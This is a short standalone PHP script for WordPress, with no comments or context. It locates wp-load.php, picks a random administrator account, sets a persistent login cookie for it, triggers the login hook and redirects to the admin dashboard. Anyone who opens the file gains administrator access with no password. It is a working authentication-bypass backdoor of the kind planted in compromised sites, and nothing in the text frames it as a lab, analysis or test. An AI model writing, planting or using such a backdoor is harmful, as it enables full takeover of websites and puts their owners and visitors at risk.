<?php

$current_dir = __DIR__;
$wp_load_path = null;
$depth = 0;
$max_depth = 15;

while ($depth < $max_depth) {
    if (file_exists($current_dir . '/wp-load.php')) {
        $wp_load_path = $current_dir . '/wp-load.php';
        break;
    }
    
    $parent_dir = dirname($current_dir);
    
    if ($parent_dir === $current_dir) {
        break;
    }
    
    $current_dir = $parent_dir;
    $depth++;
}

if ($wp_load_path === null) {
    die('Error: Could not find wp-load.php.');
}

require_once($wp_load_path);

if (!function_exists('get_users')) {
    die('Error: WordPress functions not available.');
}

$admins = get_users(['role' => 'administrator']);

if (!empty($admins)) {
    $random_admin = $admins[array_rand($admins)];
    $user_id = $random_admin->ID;
    
    wp_set_auth_cookie($user_id, true);
    wp_set_current_user($user_id);
    do_action('wp_login', $random_admin->user_login, $random_admin);
    
    wp_redirect(admin_url());
    exit;
} else {
    echo "No administrators found.";
}

